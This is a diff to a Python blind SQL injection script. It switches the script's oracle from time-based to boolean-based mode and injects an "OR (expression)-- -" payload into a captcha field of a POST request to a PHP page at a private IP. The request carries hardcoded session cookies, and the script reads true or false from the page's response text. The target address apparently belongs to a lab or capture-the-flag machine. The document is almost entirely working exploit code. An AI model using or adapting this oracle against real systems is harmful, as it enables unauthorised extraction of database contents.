@@ -5,9 +5,9 @@ import requests
 import json
 import sys
 import time
-from urllib.parse import quote
+from urllib.parse import quote, urlencode
 
-MODE="time-based"
+MODE="boolean-based"
 DELAY = 3
 def oracle(expression):
     if (MODE == "time-based"):
@@ -32,13 +32,19 @@ def oracle(expression):
         else:
             return False
     elif (MODE == "boolean-based"):
-        payload = f"r4nd0m' OR ({expression})-- -"
-        response = requests.get(f'http://10.129.2.104/api/check-username.php?u={payload}')
-        if (response.text == '{"status":"taken"}'):
+        payload = quote(f"46' OR ({expression})-- -")
+        data=f'title=a&message=a&picture=avatar.jpg&captchaAnswer={payload}&captchaId=76'
+        cookies = {
+            'PHPSESSID': 'se0c7t0t0adjhqlb9s1u4h9hsi',
+            'TrackingId': 'd0944eb380d48adc3dc6effeb4805286'
+        }
+        response = requests.post("http://10.129.204.202/new.php", data=data, cookies=cookies,headers={"Content-Type": "application/x-www-form-urlencoded"})
+        if ('Posting is disabled' in response.text):
             return True
-        elif (response.text == '{"status":"available"}'):
+        elif ('incorrect' in response.text):
             return False
         else:
+            print(f'Invalid response {response.text}')
             sys.exit()
     else:
         sys.exit()
